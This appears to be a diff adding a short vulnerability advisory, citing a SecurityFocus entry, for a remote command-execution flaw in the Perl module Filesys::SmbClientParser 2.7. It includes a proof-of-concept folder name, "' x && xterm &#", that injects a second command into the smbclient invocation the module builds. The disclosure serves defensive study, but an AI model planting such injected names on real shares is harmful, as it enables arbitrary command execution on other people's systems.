@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/30290/info
+
+The SmbClientParser Perl module is prone to a remote command-execution vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Successfully exploiting this issue will allow an attacker to execute arbitrary commands with the privileges of the user running applications that use the module.
+
+Filesys::SmbClientParser 2.7 is vulnerable; other versions may also be affected.
+
+Name a folder the following:
+' x && xterm &#
+
+A shared folder containing this named folder will execute the following command:
+/usr/bin/smbclient "//x.x.x.x/vulns" -U "user%pass" -d0 -c 'cd "'x && xterm &#"' -D "/poc" 
